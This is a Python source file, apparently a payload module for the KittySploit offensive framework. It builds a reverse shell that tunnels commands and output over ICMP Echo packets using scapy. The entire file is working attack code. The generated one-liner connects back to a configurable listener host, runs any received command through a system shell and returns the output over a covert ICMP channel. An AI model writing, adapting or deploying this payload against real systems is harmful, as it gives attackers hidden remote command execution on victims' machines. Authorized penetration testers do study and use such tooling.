#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Python Reverse ICMP Shell
Author: KittySploit Team
Version: 1.0.0

This payload creates a reverse shell over ICMP packets.
It sends commands via ICMP Echo Request and receives output via ICMP Echo Reply.

Note: Requires root/administrator privileges to send/receive raw ICMP packets.
"""

from kittysploit import *
import subprocess
import os
import platform

class Module(Payload):
    __info__ = {
        'name': 'Python Reverse ICMP Shell',
        'description': 'Connect back and create a command shell via ICMP packets',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'category': 'singles',
        'arch': Arch.PYTHON,
        'platform': Platform.ALL,
        'listener': 'listeners/multi/reverse_icmp',
        'handler': Handler.REVERSE,
        'session_type': SessionType.SHELL,
        'requires_root': True,
        'references': []
    }
    
    lhost = OptString('127.0.0.1', 'Connect to IP address', True)
    python_binary = OptString('python3', 'Python binary version', True)
    shell_binary = OptString('/bin/bash', 'The system shell in use', False, True)
    
    def generate(self):
        """
        Generate Python reverse ICMP shell payload.
        
        Returns:
            Python code as string that can be executed
        """
        # Determine shell binary based on platform
        if platform.system() == 'Windows':
            shell_cmd = 'cmd.exe'
            python_cmd = 'python'
        else:
            shell_cmd = self.shell_binary
            python_cmd = self.python_binary
        
        # Python code for ICMP reverse shell
        # Use double braces to escape in f-string
        payload_code = f'''import subprocess
import os
import sys
import time
import threading
import queue
import platform

try:
    from scapy.all import IP, ICMP, sniff, send, Raw
except ImportError:
    print("Error: scapy is required. Install with: pip install scapy")
    sys.exit(1)

class ICMPReverseShell:
    def __init__(self, target_ip, shell_cmd="{shell_cmd}"):
        self.target_ip = target_ip
        self.shell_cmd = shell_cmd
        self.running = True
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        self.sequence = 0
        
    def send_command(self, command):
        """Send command via ICMP Echo Request"""
        try:
            self.sequence += 1
            packet = IP(dst=self.target_ip)/ICMP(type=8, id=os.getpid(), seq=self.sequence)/Raw(load=command.encode())
            send(packet, verbose=0)
            return True
        except Exception as e:
            return False
    
    def receive_response(self, timeout=5):
        """Receive response via ICMP Echo Reply"""
        response_data = None
        received = threading.Event()
        
        def handle_packet(packet):
            nonlocal response_data
            if ICMP in packet and packet[ICMP].type == 0:  # ICMP Echo Reply
                if packet[IP].src == self.target_ip:
                    if Raw in packet:
                        try:
                            response_data = packet[Raw].load.decode('utf-8', errors='ignore')
                            received.set()
                        except:
                            pass
        
        try:
            filter_str = f"icmp and host {{self.target_ip}}"
            sniff(filter=filter_str, prn=handle_packet, timeout=timeout, count=1, stop_filter=lambda x: received.is_set())
        except:
            pass
        
        return response_data
    
    def execute_command(self, command):
        """Execute command and return output"""
        try:
            if platform.system() == 'Windows':
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    executable=self.shell_cmd
                )
            
            stdout, stderr = process.communicate()
            output = stdout.decode('utf-8', errors='ignore')
            if stderr:
                output += stderr.decode('utf-8', errors='ignore')
            
            return output
        except Exception as e:
            return f"Error executing command: {{str(e)}}"
    
    def run(self):
        """Main loop: send commands and receive responses"""
        # Send initial connection message
        self.send_command("CONNECT")
        time.sleep(1)
        
        print(f"[*] Connected to {{self.target_ip}} via ICMP")
        
        while self.running:
            try:
                # Send heartbeat/ready signal
                self.send_command("READY")
                
                # Wait for command from listener
                response = self.receive_response(timeout=10)
                
                if response:
                    if response == "EXIT":
                        break
                    elif response.startswith("CMD:"):
                        command = response[4:]  # Remove "CMD:" prefix
                        if command:
                            # Execute command
                            output = self.execute_command(command)
                            # Send output back
                            self.send_command(f"OUTPUT:{{output}}")
                    elif response == "PING":
                        self.send_command("PONG")
                
                time.sleep(0.5)  # Small delay between packets
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                time.sleep(1)
        
        print("[*] Connection closed")

if __name__ == "__main__":
    target_ip = "{self.lhost}"
    shell = ICMPReverseShell(target_ip)
    shell.run()
'''
        
        # Escape quotes for command line
        payload_code_escaped = payload_code.replace('"', '\\"').replace('$', '\\$')
        return f'{python_cmd} -c "{payload_code_escaped}"'

